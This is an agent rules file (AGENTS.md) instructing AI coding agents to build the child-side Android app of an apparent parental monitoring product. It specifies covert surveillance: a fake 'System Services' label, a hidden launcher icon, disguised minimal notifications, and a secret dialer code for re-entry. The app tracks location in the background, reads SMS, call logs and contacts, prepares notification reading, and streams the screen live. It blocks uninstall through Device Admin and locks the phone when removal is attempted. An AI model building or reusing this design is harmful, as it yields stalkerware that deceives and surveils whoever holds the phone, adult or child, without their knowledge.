# Child App — Agent Rules

# This file is read by every agent working inside child-app/.

# Always read root AGENTS.md first — this file extends it, never contradicts it.

---

## Purpose of This App

This app runs silently on the child's Android phone.
It is a monitoring and safety tool — not a consumer app.
It must be invisible to anyone who picks up the phone.
It must keep running no matter what the OS or OEM ROM does to it.
Every feature exists to protect the child and inform the parent.

Package: com.guardianshield.child
App label: "System Services" — looks like an OS process, never show real name
Min SDK: 26
Target SDK: 35

---

## Stealth Rules (Non-Negotiable)

- After setup wizard completes, hide the launcher icon immediately:
  packageManager.setComponentEnabledSetting(
  ComponentName(this, MainActivity::class.java),
  PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
  PackageManager.DONT_KILL_APP
  )
- Every Activity must have android:excludeFromRecents="true" in manifest
- Every Activity launch must add FLAG_EXCLUDE_FROM_RECENTS to intent flags
- Foreground notification must use:
  - NotificationManager.IMPORTANCE_MIN (no sound, no popup, no badge)
  - Title: "System Service" — never mention Guardian Shield
  - Icon: generic Android system drawable (ic_settings or ic_build)
- Parent re-entry: dialing \*#1234# on child's phone opens a hidden Activity
  (implement via a BroadcastReceiver listening for NEW_OUTGOING_CALL)
- Never log child name, phone number, or location coordinates in release builds

---

## Permissions This App Uses

Requested in this exact order during the setup wizard:

1. ACCESS_FINE_LOCATION + ACCESS_BACKGROUND_LOCATION
   → GPS tracking at all times, including when app is not in foreground

2. BIND_ACCESSIBILITY_SERVICE
   → AppMonitorService uses this to detect the foreground app
   → Guide parent: Settings → Accessibility → Guardian Shield → Enable

3. BIND_DEVICE_ADMIN (DeviceAdminReceiver)
   → Blocks uninstall and enables remote phone lock
   → Guide parent: Settings → Device Admin → Guardian Shield → Activate

4. MEDIA_PROJECTION
   → Screen capture for live streaming to parent
   → Triggered via startActivityForResult in setup wizard step 4
   → Result data must be stored in DataStore for service restarts

5. PACKAGE_USAGE_STATS
   → UsageStatsManager access for AppMonitorService
   → Guide parent: Settings → Apps → Special App Access → Usage Access

6. BIND_NOTIFICATION_LISTENER_SERVICE
   → Future notification reading feature — set up now, use later
   → Guide parent: Settings → Notification Access → Guardian Shield

7. READ_CALL_LOG + READ_SMS + READ_CONTACTS
   → Monitoring tab data for parent app
   → Request at runtime with clear explanation shown to parent

Manifest-only permissions (no runtime dialog needed):

- RECEIVE_BOOT_COMPLETED
- FOREGROUND_SERVICE
- FOREGROUND_SERVICE_LOCATION
- FOREGROUND_SERVICE_MEDIA_PROJECTION
- SEND_SMS (SOS fallback only)
- ACCESS_NETWORK_STATE (adaptive streaming quality detection)
- INTERNET

---

## Services That Must Always Run

Three services run continuously after setup completes.
All three must implement the full 3-layer survival strategy
from foreground-services/SKILL.md — no exceptions.

### LocationTrackingService

- GPS via FusedLocationProviderClient
- Default priority: PRIORITY_HIGH_ACCURACY
- Switch to PRIORITY_BALANCED_POWER_ACCURACY when battery < 15%
- Upload to child_location table in Supabase every 10 seconds
- Switch to every 5 seconds when an SOS event is active
- Switch to every 30 seconds when stationary
- Stationary detection: movement < 20m across last 3 consecutive readings
- Include battery percentage in every upload row
- If offline: cache last 5 location objects in DataStore
- Retry all cached uploads immediately when network reconnects
- Notification: IMPORTANCE_MIN, title "System Service"

### AppMonitorService

- UsageStatsManager polls every 30 seconds for foreground app
- Inserts row to app_usage table: package_name, app_name, timestamp
- Subscribes to remote_commands Realtime channel
- On BLOCK_APP command: store blocked package name in DataStore
  → Show a full-screen overlay (WindowManager TYPE_APPLICATION_OVERLAY)
  whenever that package comes to foreground

### EmergencySOSService

- Monitors location history for stationary > 30 minutes → auto-trigger SOS
- Also triggers if child manually presses the SOS home screen widget
- On any SOS trigger:
  1. Insert row in sos_events (active = true, lat, lng, triggered_at)
  2. Send SMS to parent phone:
     "SOS! [Child name] needs help.
     Location: https://maps.google.com/?q=LAT,LNG"
  3. Notify LocationTrackingService to switch to 5-second interval
- Maintains Realtime subscription to remote_commands filtered by child_id
- On LOCK command: call devicePolicyManager.lockNow() immediately
- On ALARM command: play loud alarm via AudioManager at STREAM_ALARM max volume
- On MESSAGE command: show overlay dialog with parent's message text via WindowManager
- After executing any command: update remote_commands row → executed = true

### ScreenCaptureService (on-demand only)

- Does NOT run at all times — starts only when parent opens live screen tab
- Uses MediaProjection + WebRTC as documented in webrtc-android/SKILL.md
- Connects to Railway signaling server with role = "child"
- Adaptive resolution and bitrate based on current network type
- Auto-reconnects within 3 seconds if WebRTC connection drops
- Must also implement 3-layer survival — screen stream must survive OEM kills

### Service startup sources:

- BootReceiver on device boot (BOOT_COMPLETED + QUICKBOOT_POWERON)
- ServiceWatchdogWorker via WorkManager every 15 minutes
- AlarmManager restart in each service's onDestroy() and onTaskRemoved()

---

## Supabase Auth (v3 API — use this, never the old gotrue API)

```kotlin
// Send OTP to parent's phone number
suspend fun sendOtp(phone: String): Result<Unit> {
    return try {
        supabaseClient.auth.signInWith(OTP) {
            this.phone = phone  // must be E.164 format: +91XXXXXXXXXX
        }
        Result.success(Unit)
    } catch (e: Exception) {
        Result.failure(e)
    }
}

// Verify OTP token entered by parent
suspend fun verifyOtp(phone: String, token: String): Result<Unit> {
    return try {
        supabaseClient.auth.verifyPhoneOtp(
            phone = phone,
            token = token
        )
        Result.success(Unit)
    } catch (e: Exception) {
        Result.failure(e)
    }
}

// Check session
fun isLoggedIn(): Boolean =
    supabaseClient.auth.currentSessionOrNull() != null

fun getCurrentUserId(): String? =
    supabaseClient.auth.currentSessionOrNull()?.user?.id
```

---

## Device Admin Rules

DeviceAdminReceiver registered in manifest with:

- USES_POLICY_FORCE_LOCK → enables lockNow()
- USES_POLICY_WATCH_LOGIN → monitors login attempts

On Device Admin activation:
devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)

Deactivation requires a parent-set PIN stored in DataStore.
If deactivation is attempted without the correct PIN → lockNow() immediately.

---

## Battery Optimization Rules

- Location: 10s normal → 30s stationary → 5s during SOS
- Stationary threshold: < 20m movement over 3 readings
- Switch to BALANCED accuracy when battery drops below 15%
- AppMonitor polling: every 30s only, never faster
- ScreenCapture: adaptive bitrate per webrtc-android/SKILL.md
- Target APK size: under 8MB — enforce R8 and ProGuard aggressively
- Never hold a WAKE_LOCK manually — FusedLocationProvider handles its own wakeup

---

## Setup Wizard Rules

Shown once only. After completion, never shown again.
Completion state stored in DataStore: setupCompleted = true

Step 1: Fine + Background location permission
Step 2: Accessibility Service (open Settings, wait for user to enable)
Step 3: Device Administrator (open Settings, wait for activation)
Step 4: MediaProjection permission (startActivityForResult, store result in DataStore)
Step 5: Usage Stats access (open Settings, wait for user to grant)
Step 6: Notification Listener (open Settings, wait for user to enable)
Step 7: Complete
→ Start LocationTrackingService, AppMonitorService, EmergencySOSService
→ Schedule ServiceWatchdogWorker
→ Hide launcher icon via setComponentEnabledSetting DISABLED
→ Enter stealth mode permanently

Each step must:

- Explain clearly WHY this permission is needed (parent must understand)
- Detect if already granted and auto-skip
- Not allow proceeding to next step until current permission is confirmed

---

## What Must Never Happen in This App

- Never show "Guardian Shield" as the app name anywhere visible to a stranger
- Never show a notification that mentions monitoring, tracking, or children
- Never allow uninstall without Device Admin deactivation + parent PIN
- Never stop a service without immediately scheduling its restart via AlarmManager
- Never store Supabase URL or key in source code — BuildConfig only
- Never use supabaseClient.gotrue — always supabaseClient.auth (v3 API)
- Never use Firebase, Google Maps, SharedPreferences, or any paid API
- Never use Java — Kotlin only
- Never use !! operator — use ?: return or let patterns
